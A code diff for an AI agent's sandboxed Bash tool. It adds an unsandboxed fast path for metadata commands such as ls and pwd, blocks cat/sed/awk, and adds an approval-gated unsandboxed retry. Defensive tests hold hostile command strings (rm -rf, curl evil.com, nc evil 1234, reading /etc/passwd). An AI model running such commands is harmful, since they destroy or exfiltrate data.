@@ -1,8 +1,12 @@
 //! `Bash` — execute a shell command via `sh -c` inside the OS sandbox.
-//!
-//! Matches Claude Code's Bash tool shape: one command per call, runs in its
-//! own sandboxed process. Environment variables and `cd` changes do NOT
-//! persist across invocations.
+//! Metadata-only argv0s (`ls`, `pwd`, `stat`, …) take a separate
+//! direct-`execvp` fast path (no `sh`, no sandbox, no approval) WHEN
+//! the command is a clean argv. Anything that needs a shell — wrappers,
+//! env-var prefixes, pipelines, redirection, substitution, chaining —
+//! falls back to the sandboxed + approval path. File-content viewers
+//! (`cat`, `head`, `tail`, `sed`, `awk`, …) are rejected at the tool
+//! layer to force the Read/Edit tools. Environment variables and `cd`
+//! changes do NOT persist across invocations.
 
 use std::path::{Path, PathBuf};
 use std::time::Duration;
@@ -11,7 +15,7 @@ use async_trait::async_trait;
 use serde::Deserialize;
 use serde_json::{Value, json};
 
-use crate::{ResourceAccess, Tool, ToolContext, ToolError, ToolOutput};
+use crate::{ApprovalDecision, ResourceAccess, Tool, ToolContext, ToolError, ToolOutput};
 
 const MAX_OUTPUT_BYTES: usize = 64 * 1024;
 
@@ -39,23 +43,35 @@ impl Tool for BashTool {
          changes and `cd` do not persist across invocations. Each of \
          stdout and stderr is truncated at 64 KiB.\n\n\
          IMPORTANT: Do NOT use Bash for tasks that have a dedicated tool:\n\
-         - To read files use `Read` (not cat/head/tail)\n\
+         - File-content viewers (`cat`, `head`, `tail`, `less`, `more`, \
+         `tac`) and file-driven text processors (`sed`, `awk`) are \
+         REJECTED at this layer when invoked as the leading command — \
+         use `Read` for content (`offset`/`limit` cover head/tail), \
+         `Edit` for in-place changes (safer than `sed -i`). \
+         Stream-mode `sed`/`awk` AFTER a pipe is fine (e.g. \
+         `git log | sed 's/.../.../'`) — only `sed <file>` / `awk <file>` \
+         is blocked.\n\
          - To write files use `Write` (not echo/cat with redirection)\n\
          - To search file names use `Glob` (not find/ls)\n\
          - To search file contents use `Grep` (not grep/rg)\n\
-         `sed`, `awk`, and similar text-processing tools are fine via \
-         Bash when they fit the task. Reserve Bash for system commands, \
-         git operations, build/test, and terminal tasks that require \
-         shell execution.\n\n\
+         Metadata-only commands (`ls`, `pwd`, `stat`, `file`, `which`, \
+         `dirname`, `basename`, `realpath`, `readlink`, `du`, `df`) take \
+         a fast lane: direct `execvp` (no `sh` involved), no OS sandbox, \
+         no approval gate — but ONLY when the command is a clean argv \
+         (literal metadata argv0 + plain args, optionally with quoted \
+         paths). Anything that needs a shell — wrappers (`xargs ls`, \
+         `timeout 5 ls`, `nohup ls`, `nice ls`), env-var prefixes \
+         (`LANG=C ls`), pipelines/redirects/substitution/chaining \
+         (`ls; rm`, `ls | head`, `ls $(cat …)`) — falls back to the \
+         sandboxed path with the normal approval gate. The fast lane is \
+         strictly an optimisation; nothing is rejected for shape.\n\
+         Reserve Bash for system commands, git operations, build/test, \
+         and terminal tasks that require shell execution.\n\n\
          PATHS: Any directory or file argument inside the command (cd, ls, \
          mkdir, rm, mv, cp, find, …) MUST be an absolute path. The optional \
          `cwd` parameter MUST also be absolute when provided — relative \
          values are rejected. Always quote file paths that contain spaces \
          with double quotes (e.g. `cd \"/path with spaces/file.txt\"`).\n\n\
-         SED PORTABILITY: `sed -i` is non-portable. GNU sed (Linux) accepts \
-         `sed -i …`; BSD sed (macOS) requires a backup-suffix arg, e.g. \
-         `sed -i '' …`. Prefer `sed -i.bak …` and remove the `*.bak` \
-         afterwards if the same command needs to run on both.\n\n\
          BEFORE BROAD SCANS: Do not run `find`, `du`, recursive `ls`, or \
          similar walks against unknown directories without first checking \
          their size with a bounded probe (e.g. `ls -1 <dir> | wc -l`, or a \
@@ -82,10 +98,14 @@ impl Tool for BashTool {
         params
             .get("command")
             .and_then(|v| v.as_str())
-            .map(|s| {
-                vec![ResourceAccess::ExecCommand {
+            .map(|s| match classify(s) {
+                BashClass::Sandboxed => vec![ResourceAccess::ExecCommand {
                     command: s.to_string(),
-                }]
+                }],
+                // Metadata: bypass approval; FileToolRedirect: tool will
+                // reject before it ever reaches a sandbox spawn — no
+                // point asking.
+                BashClass::Metadata | BashClass::FileToolRedirect => Vec::new(),
             })
             .unwrap_or_default()
     }
@@ -112,14 +132,6 @@ impl Tool for BashTool {
             )));
         }
 
-        let Some(sandbox) = ctx.sandbox.as_ref() else {
-            return Err(ToolError::Execution(
-                "OS sandbox unavailable: install bwrap (Linux: `apt install bubblewrap`) \
-                 or sandbox-exec (macOS, ships with the system) and restart aura"
-                    .into(),
-            ));
-        };
-
         let timeout = p
             .timeout_ms
             .map(Duration::from_millis)
@@ -127,14 +139,67 @@ impl Tool for BashTool {
 
         let command = p.command;
         let description = p.description;
-        let args = vec!["-c".into(), command.clone()];
         let cwd_ref: Option<&Path> = p.cwd.as_deref();
 
-        let out = tokio::select! {
-            _ = ctx.cancellation_token.cancelled() => {
-                return Err(ToolError::Execution("cancelled".into()));
+        let out = match classify(&command) {
+            BashClass::FileToolRedirect => {
+                let argv0 = first_token(&command).unwrap_or("?");
+                return Err(ToolError::InvalidParams(format!(
+                    "Refusing to run `{argv0}` against a file via Bash. Use the right tool \
+                     for the job:\n\
+                     - Reading content: `Read` (with `offset`/`limit` for head- and \
+                       tail-style slices).\n\
+                     - In-place file edits: `Edit` (exact-string replacement, fail-fast \
+                       on ambiguous matches; far safer than `sed -i`).\n\
+                     - Stream filtering inside a pipeline: keep `{argv0}` AFTER a pipe so \
+                       it consumes stdin instead of opening a file (e.g. \
+                       `git log | sed 's/.../.../'` is fine — only `{argv0} <file>` is \
+                       blocked).",
+                )));
             }
-            res = sandbox.spawn_command(Path::new("sh"), &args, cwd_ref, None, timeout) => res?,
+            BashClass::Metadata => {
+                let (program, argv) = parse_metadata_argv(&command)?;
+                tokio::select! {
+                    _ = ctx.cancellation_token.cancelled() => {
+                        return Err(ToolError::Execution("cancelled".into()));
+                    }
+                    res = run_unsandboxed(&program, &argv, cwd_ref, timeout) => res?,
+                }
+            }
+            BashClass::Sandboxed => {
+                let Some(sandbox) = ctx.sandbox.as_ref() else {
+                    return Err(ToolError::Execution(
+                        "OS sandbox unavailable: install bwrap (Linux: `apt install bubblewrap`) \
+                         or sandbox-exec (macOS, ships with the system) and restart aura"
+                            .into(),
+                    ));
+                };
+                let args = vec!["-c".into(), command.clone()];
+                let attempt = tokio::select! {
+                    _ = ctx.cancellation_token.cancelled() => {
+                        return Err(ToolError::Execution("cancelled".into()));
+                    }
+                    res = sandbox.spawn_command(Path::new("sh"), &args, cwd_ref, None, timeout) => res,
+                };
+                match attempt {
+                    Ok(out) => out,
+                    Err(sandbox_err) => {
+                        // Sandbox infrastructure refused the command (cwd
+                        // outside workspace, bwrap setup failure, runner
+                        // error, …). Offer the user a one-shot
+                        // unsandboxed retry that surfaces the failure
+                        // reason in the approval prompt.
+                        prompt_and_run_unsandboxed_retry(
+                            &command,
+                            cwd_ref,
+                            timeout,
+                            ctx,
+                            sandbox_err,
+                        )
+                        .await?
+                    }
+                }
+            }
         };
 
         if out.timed_out {
@@ -172,7 +237,7 @@ fn interpret_exit(command: &str, exit_code: i32) -> Option<&'static str> {
     if exit_code != 1 {
         return None;
     }
-    let argv0 = leading_token(command)?;
+    let argv0 = first_token(command)?;
     match argv0 {
         "grep" | "rg" | "ag" | "fgrep" | "egrep" => Some("no matches"),
         "diff" | "cmp" => Some("differences found"),
@@ -180,52 +245,205 @@ fn interpret_exit(command: &str, exit_code: i32) -> Option<&'static str> {
     }
 }
 
-/// Extract the first real argv0 from a shell-style command string,
-/// stripping `KEY=value` env-var prefixes and a small set of common
-/// wrapper commands so e.g. `LD_PRELOAD=… timeout 30 grep foo bar`
-/// still classifies as `grep`. Returns `None` on empty input.
-///
-/// Wrappers that take an argument before the inner command get one
-/// extra non-flag token consumed (`timeout 30 grep …` → `grep`).
-fn leading_token(command: &str) -> Option<&str> {
-    /// Wrappers whose syntax is `WRAPPER [FLAGS…] INNER…` — strip the
-    /// wrapper and skip flags but keep the next non-flag token.
-    const PASSTHROUGH_WRAPPERS: &[&str] = &["xargs", "env", "stdbuf", "nice", "ionice"];
-    /// Wrappers whose syntax is `WRAPPER [FLAGS…] ARG INNER…` — also
-    /// consume one extra non-flag token (the wrapper's own argument)
-    /// before the inner command.
-    const ARG_WRAPPERS: &[&str] = &["timeout"];
-
-    let mut tokens = command.split_whitespace();
-    while let Some(raw) = tokens.next() {
-        let bare = raw.trim_start_matches('\\');
-        if bare.contains('=') && !bare.starts_with('=') {
-            continue;
-        }
-        if bare.starts_with('-') {
-            continue;
-        }
-        let stripped = strip_path(bare);
-        if PASSTHROUGH_WRAPPERS.contains(&stripped) {
-            continue;
-        }
-        if ARG_WRAPPERS.contains(&stripped) {
-            // Discard the wrapper's own arg (e.g. `30` in `timeout 30 grep`),
-            // skipping any flags that precede it.
-            for arg in tokens.by_ref() {
-                if !arg.starts_with('-') {
-                    break;
-                }
-            }
-            continue;
-        }
-        return Some(stripped);
-    }
-    None
-}
-
 fn strip_path(s: &str) -> &str {
     s.rsplit('/').next().unwrap_or(s)
+}
+
+#[derive(Debug, PartialEq, Eq)]
+enum BashClass {
+    /// argv0 only inspects filesystem metadata. Runs unsandboxed (so the
+    /// agent can list paths outside `workspace_root`) and skips approval.
+    Metadata,
+    /// argv0 operates on file contents (`cat`, `head`, `tail`, `less`,
+    /// `more`, `tac`, `sed`, `awk`, …). Rejected at the tool layer with
+    /// a hint pointing at `Read` (for content) or `Edit` (for in-place
+    /// edits) — these have safer, more structured alternatives.
+    FileToolRedirect,
+    /// Everything else — sandbox + approval gate, as before.
+    Sandboxed,
+}
+
+const METADATA_COMMANDS: &[&str] = &[
+    "ls", "pwd", "stat", "file", "which", "dirname", "basename", "realpath", "readlink", "du", "df",
+];
+
+const FILE_TOOL_REDIRECT_COMMANDS: &[&str] = &[
+    "cat", "head", "tail", "less", "more", "tac", "sed", "awk", "gawk", "mawk",
+];
+
+fn classify(command: &str) -> BashClass {
+    let Some(t) = first_token(command) else {
+        return BashClass::Sandboxed;
+    };
+    if FILE_TOOL_REDIRECT_COMMANDS.contains(&t) {
+        return BashClass::FileToolRedirect;
+    }
+    if METADATA_COMMANDS.contains(&t) {
+        // The fast path runs without `sh`, so any shell metacharacter
+        // would be inert. Rather than reject, we demote to Sandboxed so
+        // the command still runs — through the OS sandbox and the
+        // approval gate, which is what the user actually wants for
+        // shell-needing variants of metadata commands.
+        if has_shell_metachars(command).is_some() {
+            return BashClass::Sandboxed;
+        }
+        return BashClass::Metadata;
+    }
+    BashClass::Sandboxed
+}
+
+fn has_shell_metachars(command: &str) -> Option<char> {
+    command.chars().find(|c| FORBIDDEN_METACHARS.contains(c))
+}
+
+/// argv0 of the command string — the first whitespace-separated token,
+/// path-stripped (`/usr/bin/ls` → `ls`). Does NOT skip wrappers (`xargs`,
+/// `timeout`, `nohup`, …) and does NOT skip `KEY=VAL` env-var prefixes,
+/// because both need a real shell to take effect and the metadata fast
+/// path runs without one. Wrapped or env-prefixed commands fall through
+/// to Sandboxed where the shell actually runs.
+fn first_token(command: &str) -> Option<&str> {
+    let raw = command.split_whitespace().next()?;
+    let bare = raw.trim_start_matches('\\');
+    if bare.contains('=') && !bare.starts_with('=') {
+        return None;
+    }
+    Some(strip_path(bare))
+}
+
+/// Shell control characters that need a real shell to take effect.
+/// `classify()` uses this set to demote metadata commands containing any
+/// of these (`ls /tmp; rm -rf x`, `ls $(cat …)`, `ls | nc evil 1234`, …)
+/// from the unsandboxed fast lane to the sandboxed + approved path —
+/// they still run, just under the normal gate.
+const FORBIDDEN_METACHARS: &[char] = &[
+    ';', '&', '|', '$', '`', '<', '>', '(', ')', '{', '}', '\n', '\r',
+];
+
+fn parse_metadata_argv(command: &str) -> crate::Result<(String, Vec<String>)> {
+    let parts = shell_words::split(command)
+        .map_err(|e| ToolError::InvalidParams(format!("failed to parse metadata argv: {e}")))?;
+    let mut iter = parts.into_iter();
+    let program = iter
+        .next()
+        .ok_or_else(|| ToolError::InvalidParams("metadata command was empty".into()))?;
+    Ok((program, iter.collect()))
+}
+
+async fn prompt_and_run_unsandboxed_retry(
+    command: &str,
+    cwd: Option<&Path>,
+    timeout: Duration,
+    ctx: &ToolContext,
+    sandbox_err: ToolError,
+) -> crate::Result<crate::SandboxedOutput> {
+    let Some(approval) = ctx.approval.as_ref() else {
+        return Err(ToolError::Execution(format!(
+            "sandboxed run failed and no mid-execution approval handle is wired, \
+             cannot offer unsandboxed retry: {sandbox_err}"
+        )));
+    };
+    let preview = format!(
+        "Sandboxed `Bash` invocation failed.\n\
+         Command : {command}\n\
+         Reason  : {sandbox_err}\n\
+         Approve to retry the SAME command WITHOUT the OS sandbox \
+         (full shell, no workspace cwd guard, no resource limits)."
+    );
+    // Cache must be bypassed: a prior sandboxed approval for this
+    // command does NOT cover an unsandboxed run, and we never persist
+    // an "approve always" on this elevated path either.
+    let decision = approval
+        .request_uncached(
+            "Bash",
+            &ctx.session_id,
+            &ctx.user,
+            vec![ResourceAccess::ExecCommand {
+                command: command.to_string(),
+            }],
+            preview,
+        )
+        .await;
+    match decision {
+        ApprovalDecision::Approve | ApprovalDecision::ApproveAlways => {
+            let args = ["-c".to_string(), command.to_string()];
+            tokio::select! {
+                _ = ctx.cancellation_token.cancelled() => {
+                    Err(ToolError::Execution("cancelled".into()))
+                }
+                res = run_unsandboxed("sh", &args, cwd, timeout) => res,
+            }
+        }
+        ApprovalDecision::Deny => Err(ToolError::Execution(format!(
+            "sandboxed run failed and the unsandboxed retry was denied: {sandbox_err}"
+        ))),
+    }
+}
+
+async fn run_unsandboxed(
+    program: &str,
+    args: &[String],
+    cwd: Option<&Path>,
+    timeout: Duration,
+) -> crate::Result<crate::SandboxedOutput> {
+    use std::process::Stdio;
+    use tokio::io::AsyncReadExt;
+    use tokio::process::Command;
+
+    let mut cmd = Command::new(program);
+    cmd.args(args);
+    if let Some(dir) = cwd {
+        cmd.current_dir(dir);
+    }
+    cmd.stdin(Stdio::null());
+    cmd.stdout(Stdio::piped());
+    cmd.stderr(Stdio::piped());
+    cmd.kill_on_drop(true);
+
+    let mut child = cmd
+        .spawn()
+        .map_err(|e| ToolError::Execution(format!("spawn `{program}`: {e}")))?;
+
+    let mut stdout_pipe = child
+        .stdout
+        .take()
+        .ok_or_else(|| ToolError::Execution("child stdout pipe missing".into()))?;
+    let mut stderr_pipe = child
+        .stderr
+        .take()
+        .ok_or_else(|| ToolError::Execution("child stderr pipe missing".into()))?;
+
+    let stdout_task = tokio::spawn(async move {
+        let mut buf = Vec::new();
+        let _ = stdout_pipe.read_to_end(&mut buf).await;
+        buf
+    });
+    let stderr_task = tokio::spawn(async move {
+        let mut buf = Vec::new();
+        let _ = stderr_pipe.read_to_end(&mut buf).await;
+        buf
+    });
+
+    let (timed_out, exit_code) = tokio::select! {
+        wait = child.wait() => {
+            (false, wait.ok().and_then(|s| s.code()).unwrap_or(-1))
+        }
+        _ = tokio::time::sleep(timeout) => {
+            let _ = child.start_kill();
+            let _ = child.wait().await;
+            (true, -1)
+        }
+    };
+
+    let stdout = stdout_task.await.unwrap_or_default();
+    let stderr = stderr_task.await.unwrap_or_default();
+
+    Ok(crate::SandboxedOutput {
+        exit_code,
+        stdout,
+        stderr,
+        timed_out,
+    })
 }
 
 fn truncate_utf8(bytes: &[u8], max: usize) -> String {
@@ -248,8 +466,10 @@ fn truncate_utf8(bytes: &[u8], max: usize) -> String {
 mod tests {
     use super::*;
     use crate::SandboxedOutput;
-    use crate::test_support::FakeExecSandbox;
+    use crate::test_support::{FakeApprovalGate, FakeExecSandbox};
+    use crate::{ApprovalHandle, ApprovedResource};
     use aura_model::{ChannelType, User};
+    use parking_lot::Mutex;
     use std::sync::Arc;
     use tokio_util::sync::CancellationToken;
 
@@ -271,6 +491,16 @@ mod tests {
         }
     }
 
+    fn ctx_with_approval(
+        sandbox: Option<Arc<dyn crate::ExecSandbox>>,
+        gate: Arc<FakeApprovalGate>,
+    ) -> ToolContext {
+        let mut ctx = ctx_with(sandbox);
+        let cache: Arc<Mutex<Vec<ApprovedResource>>> = Arc::new(Mutex::new(Vec::new()));
+        ctx.approval = Some(ApprovalHandle::new(gate, cache));
+        ctx
+    }
+
     fn fake_with_response(
         out: SandboxedOutput,
     ) -> (Arc<FakeExecSandbox>, Arc<dyn crate::ExecSandbox>) {
@@ -278,6 +508,27 @@ mod tests {
         fake.set_response(out);
         let dyn_handle: Arc<dyn crate::ExecSandbox> = fake.clone();
         (fake, dyn_handle)
+    }
+
+    /// `ExecSandbox` whose `spawn_command` always returns the configured
+    /// `Err` — needed to exercise the sandbox-failure → unsandboxed-retry
+    /// path. `FakeExecSandbox` only models the success side.
+    struct FailingExecSandbox {
+        message: String,
+    }
+
+    #[async_trait::async_trait]
+    impl crate::ExecSandbox for FailingExecSandbox {
+        async fn spawn_command(
+            &self,
+            _program: &Path,
+            _args: &[String],
+            _cwd: Option<&Path>,
+            _stdin: Option<&[u8]>,
+            _timeout: Duration,
+        ) -> crate::Result<SandboxedOutput> {
+            Err(ToolError::Execution(self.message.clone()))
+        }
     }
 
     #[tokio::test]
@@ -413,10 +664,7 @@ mod tests {
             timed_out: false,
         });
         let out = BashTool
-            .execute(
-                json!({ "command": "ls /nonexistent" }),
-                &ctx_with(Some(sandbox)),
-            )
+            .execute(json!({ "command": "false" }), &ctx_with(Some(sandbox)))
             .await
             .unwrap();
         let ToolOutput::Json(v) = out else { panic!() };
@@ -447,13 +695,13 @@ mod tests {
         let (_fake, sandbox) = fake_with_response(SandboxedOutput::default());
         let out = BashTool
             .execute(
-                json!({ "command": "ls", "description": "List files in current directory" }),
+                json!({ "command": "echo hi", "description": "Print greeting" }),
                 &ctx_with(Some(sandbox)),
             )
             .await
             .unwrap();
         let ToolOutput::Json(v) = out else { panic!() };
-        assert_eq!(v["description"], "List files in current directory");
+        assert_eq!(v["description"], "Print greeting");
     }
 
     #[test]
@@ -467,6 +715,106 @@ mod tests {
         assert_eq!(
             BashTool.call_label(&json!({ "command": "ls", "description": "   " })),
             None
+        );
+    }
+
+    #[tokio::test]
+    async fn sandbox_err_with_approval_approve_falls_back_to_unsandboxed() {
+        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
+            message: "cwd `/etc` outside workspace".into(),
+        });
+        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Approve));
+        let ctx = ctx_with_approval(Some(sandbox), gate.clone());
+
+        let out = BashTool
+            .execute(json!({ "command": "echo hi" }), &ctx)
+            .await
+            .expect("approved unsandboxed retry must succeed");
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert_eq!(v["exit_code"], 0);
+        assert!(v["stdout"].as_str().unwrap_or("").contains("hi"));
+
+        // The approval prompt fired once, with the failure reason and
+        // the original command both surfaced in the params preview.
+        let reqs = gate.requests();
+        assert_eq!(reqs.len(), 1, "expected one approval prompt: {reqs:?}");
+        assert!(
+            reqs[0]
+                .params_preview
+                .contains("cwd `/etc` outside workspace")
+                && reqs[0].params_preview.contains("echo hi")
+                && reqs[0].params_preview.contains("WITHOUT the OS sandbox"),
+            "preview missing required context: {}",
+            reqs[0].params_preview
+        );
+    }
+
+    #[tokio::test]
+    async fn sandbox_err_with_approval_deny_surfaces_original_error() {
+        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
+            message: "bwrap setup failure".into(),
+        });
+        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Deny));
+        let ctx = ctx_with_approval(Some(sandbox), gate.clone());
+
+        let err = BashTool
+            .execute(json!({ "command": "echo hi" }), &ctx)
+            .await
+            .unwrap_err();
+        let ToolError::Execution(msg) = err else {
+            panic!("expected Execution error, got: {err:?}");
+        };
+        assert!(
+            msg.contains("bwrap setup failure") && msg.contains("denied"),
+            "deny should annotate the original sandbox error: {msg}"
+        );
+        assert_eq!(gate.requests().len(), 1, "deny path still prompts once");
+    }
+
+    #[tokio::test]
+    async fn sandbox_err_without_approval_handle_returns_explanatory_error() {
+        let sandbox: Arc<dyn crate::ExecSandbox> = Arc::new(FailingExecSandbox {
+            message: "bwrap setup failure".into(),
+        });
+        let ctx = ctx_with(Some(sandbox));
+
+        let err = BashTool
+            .execute(json!({ "command": "echo hi" }), &ctx)
+            .await
+            .unwrap_err();
+        let ToolError::Execution(msg) = err else {
+            panic!("expected Execution error, got: {err:?}");
+        };
+        assert!(
+            msg.contains("no mid-execution approval handle") && msg.contains("bwrap setup failure"),
+            "error must explain why retry wasn't offered AND keep original reason: {msg}"
+        );
+    }
+
+    #[tokio::test]
+    async fn sandbox_ok_does_not_prompt_for_unsandboxed_retry() {
+        let (_fake, sandbox) = fake_with_response(SandboxedOutput {
+            exit_code: 1,
+            stdout: Vec::new(),
+            stderr: b"command failed\n".to_vec(),
+            timed_out: false,
+        });
+        let gate = Arc::new(FakeApprovalGate::new(ApprovalDecision::Approve));
+        let ctx = ctx_with_approval(Some(sandbox), gate.clone());
+
+        // Non-zero exit is the command's own failure, not a sandbox
+        // infrastructure failure. We must NOT auto-prompt for an
+        // unsandboxed retry — that would be noise on every failed test.
+        let out = BashTool
+            .execute(json!({ "command": "false" }), &ctx)
+            .await
+            .expect("non-zero exit returns Ok");
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert_eq!(v["exit_code"], 1);
+        assert!(
+            gate.requests().is_empty(),
+            "no approval prompt for non-zero exit: {:?}",
+            gate.requests()
         );
     }
 
@@ -498,14 +846,205 @@ mod tests {
     }
 
     #[test]
-    fn leading_token_strips_env_and_wrappers() {
-        assert_eq!(leading_token("grep foo bar"), Some("grep"));
+    fn classify_routes_metadata_content_and_default() {
+        // Metadata fast path — only literal first-token argv0 qualifies.
+        assert_eq!(classify("ls /etc"), BashClass::Metadata);
+        assert_eq!(classify("/usr/bin/stat foo"), BashClass::Metadata);
+        assert_eq!(classify("pwd"), BashClass::Metadata);
+        assert_eq!(classify("du -sh /home"), BashClass::Metadata);
+
+        // Wrapped or env-prefixed metadata commands fall through to the
+        // sandboxed path on purpose — wrappers/env-vars need a real
+        // shell, and metadata mode runs without one.
+        assert_eq!(classify("LANG=C ls -la"), BashClass::Sandboxed);
+        assert_eq!(classify("xargs ls"), BashClass::Sandboxed);
+        assert_eq!(classify("timeout 5 du -sh ."), BashClass::Sandboxed);
+        assert_eq!(classify("nohup ls /tmp"), BashClass::Sandboxed);
+        assert_eq!(classify("nice -n 10 ls"), BashClass::Sandboxed);
+
+        // FileToolRedirect — only catches the literal leading argv0. Wrapped
+        // variants like `xargs cat`, `LANG=C cat`, `timeout 5 head` route
+        // through Sandboxed instead (best-effort tool-layer policy, not a
+        // hard gate; same trade-off as `nohup cat` and `bash -c "cat …"`).
+        assert_eq!(classify("cat foo.txt"), BashClass::FileToolRedirect);
+        assert_eq!(classify("head -n 10 a.log"), BashClass::FileToolRedirect);
+        assert_eq!(classify("/usr/bin/less x"), BashClass::FileToolRedirect);
+        assert_eq!(classify("sed -i 's/a/b/' f"), BashClass::FileToolRedirect);
+        assert_eq!(classify("awk '{print $1}' f"), BashClass::FileToolRedirect);
         assert_eq!(
-            leading_token("LD_PRELOAD=x timeout 30 grep foo"),
-            Some("grep")
+            classify("gawk -F, '{print}' f"),
+            BashClass::FileToolRedirect
         );
-        assert_eq!(leading_token("/usr/bin/grep foo"), Some("grep"));
-        assert_eq!(leading_token("env FOO=bar rg pat"), Some("rg"));
-        assert_eq!(leading_token(""), None);
+        assert_eq!(classify("mawk '/x/' f"), BashClass::FileToolRedirect);
+
+        assert_eq!(classify("echo hi"), BashClass::Sandboxed);
+        assert_eq!(classify("grep foo bar.txt"), BashClass::Sandboxed);
+        assert_eq!(classify("xargs cat foo"), BashClass::Sandboxed);
+        assert_eq!(classify("LANG=C cat foo"), BashClass::Sandboxed);
+        assert_eq!(classify("timeout 5 head log"), BashClass::Sandboxed);
+        assert_eq!(classify(""), BashClass::Sandboxed);
+    }
+
+    #[test]
+    fn first_token_strips_path_but_not_wrappers_or_env() {
+        assert_eq!(first_token("ls /etc"), Some("ls"));
+        assert_eq!(first_token("/usr/bin/stat foo"), Some("stat"));
+        // Wrappers and env-vars are NOT unwrapped — that's the point.
+        assert_eq!(first_token("xargs ls"), Some("xargs"));
+        assert_eq!(first_token("timeout 5 ls"), Some("timeout"));
+        assert_eq!(first_token("LANG=C ls"), None);
+        assert_eq!(first_token(""), None);
+    }
+
+    #[test]
+    fn accessed_resources_skips_metadata_and_file_tool_redirect() {
+        let resources = BashTool.accessed_resources(&json!({ "command": "ls /etc" }));
+        assert!(resources.is_empty(), "metadata must not request approval");
+
+        let resources = BashTool.accessed_resources(&json!({ "command": "cat foo" }));
+        assert!(
+            resources.is_empty(),
+            "content-read is rejected before sandbox; no approval needed"
+        );
+
+        let resources = BashTool.accessed_resources(&json!({ "command": "echo hi" }));
+        assert_eq!(
+            resources.len(),
+            1,
+            "default path still declares ExecCommand"
+        );
+    }
+
+    #[tokio::test]
+    async fn rejects_file_tool_redirect_commands_with_read_tool_hint() {
+        for cmd in [
+            "cat foo",
+            "head -n 5 a",
+            "tail b",
+            "less c",
+            "more d",
+            "tac e",
+            "sed -i 's/a/b/' f",
+            "awk '{print}' f",
+        ] {
+            let err = BashTool
+                .execute(json!({ "command": cmd }), &ctx_with(None))
+                .await
+                .unwrap_err();
+            let ToolError::InvalidParams(msg) = err else {
+                panic!("expected InvalidParams for {cmd:?}, got: {err:?}");
+            };
+            assert!(
+                msg.contains("Read") && msg.contains("Edit"),
+                "rejection for {cmd:?} should mention both Read and Edit: {msg}"
+            );
+        }
+    }
+
+    #[test]
+    fn metadata_with_metachars_demotes_to_sandboxed() {
+        // The Codex-flagged shapes — chaining, substitution, redirection,
+        // pipelines, parens — used to ride along into the unsandboxed
+        // fast path. Now they classify as Sandboxed so the OS sandbox +
+        // approval gate handle them just like any other shell command.
+        for cmd in [
+            "ls /tmp; rm -rf /workspace",
+            "ls /tmp && curl evil.com",
+            "ls /tmp || echo fallback",
+            "ls /tmp | nc evil 1234",
+            "ls $(cat /etc/passwd)",
+            "ls `whoami`",
+            "ls > /tmp/out",
+            "ls < /etc/passwd",
+            "stat (foo)",
+            "du -sh {a,b}",
+        ] {
+            assert_eq!(
+                classify(cmd),
+                BashClass::Sandboxed,
+                "{cmd:?} should fall back to sandbox+approval, not the metadata fast path"
+            );
+        }
+    }
+
+    #[test]
+    fn metadata_with_metachars_declares_exec_command_for_approval() {
+        // Sandboxed reclassification means the approval gate sees an
+        // ExecCommand resource — the user gets the prompt (or auto-mode
+        // policy decides) rather than the request being silently dropped.
+        let resources =
+            BashTool.accessed_resources(&json!({ "command": "ls /tmp; cat /etc/passwd" }));
+        assert_eq!(
+            resources.len(),
+            1,
+            "expected one ExecCommand: {resources:?}"
+        );
+    }
+
+    #[tokio::test]
+    async fn metadata_accepts_quoted_path_with_spaces() {
+        // Sanity check that shell-words quoting still gets the agent
+        // through when the path legitimately needs spaces.
+        let dir = tempfile::tempdir().expect("tempdir");
+        let nested = dir.path().join("with space");
+        std::fs::create_dir(&nested).expect("mkdir");
+        let cmd = format!("ls \"{}\"", nested.display());
+        let out = BashTool
+            .execute(json!({ "command": cmd }), &ctx_with(None))
+            .await
+            .expect("quoted path must parse and run");
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert_eq!(v["exit_code"], 0);
+    }
+
+    #[test]
+    fn parse_metadata_argv_splits_on_whitespace_and_quotes() {
+        let (prog, args) = parse_metadata_argv("ls -la /tmp").unwrap();
+        assert_eq!(prog, "ls");
+        assert_eq!(args, vec!["-la".to_string(), "/tmp".to_string()]);
+
+        let (prog, args) = parse_metadata_argv("stat \"/var/log with spaces/x\"").unwrap();
+        assert_eq!(prog, "stat");
+        assert_eq!(args, vec!["/var/log with spaces/x".to_string()]);
+    }
+
+    #[test]
+    fn pipe_from_sed_is_not_classified_file_tool_redirect() {
+        // Leading_token of `git log | sed ...` is `git`, so the pipeline
+        // falls through to Sandboxed — that's the documented escape hatch
+        // for stream-mode sed/awk.
+        assert_eq!(classify("git log | sed 's/foo/bar/'"), BashClass::Sandboxed);
+    }
+
+    #[tokio::test]
+    async fn metadata_runs_without_sandbox_and_skips_fake() {
+        // No sandbox in ctx — would be an error for any other command.
+        let out = BashTool
+            .execute(json!({ "command": "pwd" }), &ctx_with(None))
+            .await
+            .expect("metadata commands must succeed without a sandbox");
+        let ToolOutput::Json(v) = out else { panic!() };
+        assert_eq!(v["exit_code"], 0);
+        assert!(
+            !v["stdout"].as_str().unwrap_or("").is_empty(),
+            "pwd should print the current working directory"
+        );
+    }
+
+    #[tokio::test]
+    async fn metadata_path_does_not_consult_sandbox() {
+        let fake = Arc::new(FakeExecSandbox::new());
+        // No response set — if BashTool wrongly routes through the fake,
+        // the fake's spawn_command yields its default error and we'd see
+        // a non-zero exit / sandbox error.
+        let dyn_handle: Arc<dyn crate::ExecSandbox> = fake.clone();
+        BashTool
+            .execute(json!({ "command": "pwd" }), &ctx_with(Some(dyn_handle)))
+            .await
+            .expect("metadata bypasses sandbox even when one is present");
+        assert!(
+            fake.calls().is_empty(),
+            "metadata commands must not call the sandbox"
+        );
     }
 }
